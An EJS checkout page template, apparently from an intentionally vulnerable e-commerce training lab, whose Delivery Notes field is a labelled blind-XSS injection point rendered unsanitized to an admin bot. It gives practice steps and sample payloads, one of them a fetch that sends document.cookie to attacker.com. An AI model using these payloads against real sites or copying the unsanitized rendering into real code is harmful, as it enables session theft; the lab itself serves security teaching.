<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout - ElectroStore</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <%- include('partials/header', { user: user, cart: cart }) %>

    <main class="main-content">
        <div class="container">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h1><i class="fas fa-credit-card"></i> Checkout</h1>
                <div>
                    <a href="/cart" class="btn btn-secondary">
                        <i class="fas fa-arrow-left"></i> Back to Cart
                    </a>
                </div>
            </div>

            <% if (!cart || cart.length === 0) { %>
                <div class="card">
                    <div class="card-body text-center p-5">
                        <i class="fas fa-shopping-cart fa-3x text-muted mb-3"></i>
                        <h3>Your cart is empty</h3>
                        <p>Add some products to your cart before checking out.</p>
                        <a href="/products" class="btn btn-primary">
                            <i class="fas fa-store"></i> Browse Products
                        </a>
                    </div>
                </div>
            <% } else { %>
                <div class="row" style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
                    <!-- Order Summary -->
                    <div>
                        <div class="card mb-4">
                            <div class="card-header">
                                <h3 class="card-title">
                                    <i class="fas fa-shopping-cart"></i> Order Summary
                                </h3>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th>Product</th>
                                                <th>Quantity</th>
                                                <th>Price</th>
                                                <th>Total</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <% cartItems.forEach(item => { %>
                                                <tr>
                                                    <td><%= item.name %></td>
                                                    <td><%= item.quantity %></td>
                                                    <td>$<%= item.price.toFixed(2) %></td>
                                                    <td>$<%= item.itemTotal.toFixed(2) %></td>
                                                </tr>
                                            <% }) %>
                                        </tbody>
                                        <tfoot>
                                            <tr>
                                                <td colspan="3" class="text-end"><strong>Total:</strong></td>
                                                <td><strong>$<%= total.toFixed(2) %></strong></td>
                                            </tr>
                                        </tfoot>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Checkout Form -->
                    <div>
                        <div class="card">
                            <div class="card-header">
                                <h3 class="card-title">
                                    <i class="fas fa-truck"></i> Shipping Information
                                </h3>
                            </div>
                            <div class="card-body">
                                <form action="/checkout" method="POST">
                                    <!-- Shipping Address -->
                                    <div class="form-group mb-4">
                                        <label for="address" class="form-label">
                                            <i class="fas fa-map-marker-alt"></i> Shipping Address *
                                        </label>
                                        <textarea 
                                            id="address" 
                                            name="address" 
                                            class="form-control" 
                                            rows="3" 
                                            placeholder="Enter your complete shipping address"
                                            required
                                        ></textarea>
                                        <div class="form-text">
                                            Please provide your full address including street, city, state, and ZIP code.
                                        </div>
                                    </div>

                                    <!-- Delivery Notes (XSS Injection Point) -->
                                    <div class="form-group mb-4">
                                        <label for="deliveryNotes" class="form-label">
                                            <i class="fas fa-sticky-note"></i> Delivery Notes
                                            <span class="badge badge-danger" style="background-color: var(--danger-color); color: white; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-left: 0.5rem;">
                                                XSS INJECTION POINT
                                            </span>
                                        </label>
                                        <textarea 
                                            id="deliveryNotes" 
                                            name="deliveryNotes" 
                                            class="form-control" 
                                            rows="4" 
                                            placeholder="Enter any special delivery instructions"
                                        ></textarea>
                                        <div class="form-text">
                                            <strong>Security Training:</strong> This field is vulnerable to XSS. Try injecting payloads like:
                                            <code><!-- <script>alert('XSS')</script> --></code>
                                        </div>
                                        <div class="security-warning mt-2">
                                            <i class="fas fa-exclamation-triangle"></i>
                                            <strong>Warning:</strong> The admin order details page renders these notes without sanitization.
                                            Any script you enter here will execute when an admin views your order.
                                        </div>
                                    </div>

                                    <!-- Security Notice -->
                                    <div class="card mb-4" style="border-color: var(--warning-color);">
                                        <div class="card-body">
                                            <h5 class="card-title">
                                                <i class="fas fa-shield-alt"></i> Security Training Notice
                                            </h5>
                                            <p>This is a <strong>security training environment</strong>. The delivery notes field contains a deliberate XSS vulnerability for educational purposes.</p>
                                            <p><strong>Do not enter real personal information.</strong> Use test data only.</p>
                                        </div>
                                    </div>

                                    <!-- Submit Button -->
                                    <div class="d-grid">
                                        <button type="submit" class="btn btn-primary btn-lg">
                                            <i class="fas fa-check-circle"></i> Place Order
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>

                        <!-- XSS Training Information -->
                        <div class="card mt-4">
                            <div class="card-header">
                                <h3 class="card-title">
                                    <i class="fas fa-graduation-cap"></i> XSS Training Instructions
                                </h3>
                            </div>
                            <div class="card-body">
                                <h5>How to practice Blind XSS:</h5>
                                <ol>
                                    <li>Enter a shipping address (any test address)</li>
                                    <li>Inject an XSS payload in the Delivery Notes field</li>
                                    <li>Click "Place Order" to submit</li>
                                    <li>The admin bot will automatically view your order within 60 seconds</li>
                                    <li>Your payload will execute in the admin context</li>
                                </ol>

                                <h5 class="mt-3">Sample Payloads:</h5>
                                <div class="code-samples">
                                    <pre><code><!-- <script>alert('XSS')</script> --></code></pre>
                                    <!-- <pre><code><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></code></pre>
                                    <pre><code><img src=x onerror="alert('XSS')"></code></pre>
                                    <pre><code><svg onload="alert('XSS')"></svg></code></pre> -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            <% } %>
        </div>
    </main>
    
    <%- include('partials/footer') %>

    <script src="/js/main.js"></script>
    <script>
    // Auto-focus on address field
    document.addEventListener('DOMContentLoaded', function() {
        const addressField = document.getElementById('address');
        if (addressField) {
            addressField.focus();
        }
    });
    </script>
</body>
</html>